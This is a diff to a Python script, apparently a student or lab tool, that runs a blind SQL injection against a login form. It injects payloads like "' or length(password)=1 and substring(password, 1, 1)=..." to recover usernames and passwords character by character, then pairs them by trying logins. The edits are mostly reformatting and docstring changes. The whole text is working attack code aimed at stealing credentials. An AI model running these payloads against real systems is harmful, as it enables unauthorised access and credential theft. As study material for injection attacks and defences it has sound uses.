@@ -53,7 +53,7 @@ def getUsers(max_length):
     # is != 1, but is still the first char of a user it  gets appended t0
     # partialUsers 
     for i in iter.chain(range(48,58), range(97, 123)):
-        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" +
+        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + 
                                     '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
         if get_answer(params):
             doneUsers.append(str(chr(i)))
@@ -101,10 +101,12 @@ def getPasswords(max_length):
     # is != 1, but is still the first char of a password it gets appended t0
     # partial
     for i in iter.chain(range(48,58), range(97, 123)):
-        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" +
+                                                                '\"' + str(chr(i)) + '\"' + " -- '"}
         if get_answer(params):
             done.append(str(chr(i)))
-        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
+        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + 
+                                                                '\"' + str(chr(i)) + '\"' + " -- '"}
         if get_answer(params):
             partial.append(str(chr(i)))
 
@@ -138,18 +140,21 @@ Returns: none
 Description: This function takes lists of known usernames and passwords and
              matches them based on successful authentications with the target
              database. If the combination authenticates, it prints out the 
-             pair and removes them from the lists.
-
+             pair.
 """
 def matchPasswords(users, passwords):
-
        for user in users:
            for password in passwords:
                 params = {'userName': user, 'password': password}
                 if get_answer(params):
                     print(user, ":", password) 
-                    users.remove(user)
-                    passwords.remove(password)
+                    
+"""
+Function: main
+Parameters: none
+Returns: none
+Description: Calls getUsers, getPasswords and matchPasswords
+"""
 def main():
     users = getUsers(8)
     passwords = getPasswords(8)
